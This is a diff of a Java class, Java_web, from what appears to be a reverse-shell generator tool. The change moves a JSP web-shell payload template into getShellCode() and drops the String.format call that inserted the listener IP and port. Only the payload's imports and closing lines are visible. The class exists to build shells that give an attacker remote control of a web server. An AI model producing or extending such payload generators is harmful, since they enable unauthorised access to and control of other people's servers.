@@ -8,7 +8,11 @@ public class Java_web extends Reverse {
 
     public Java_web(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("<%@\r\n" + //
+    }
+
+    @Override
+    public String getShellCode(){
+        return "<%@\r\n" + //
                 "page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"\r\n" + //
                 "% >\r\n" + //
                 "<%!\r\n" + //
@@ -82,12 +86,7 @@ public class Java_web extends Reverse {
                 "        }\r\n" + //
                 "        catch(Exception e) \r\n" + //
                 "}\r\n" + //
-                "%>", this.getLocalIP(), this.getLocalPort());
-    }
-
-    @Override
-    public String getShellCode(){
-        return shellFormat;
+                "%>";
     }
 
     @Override
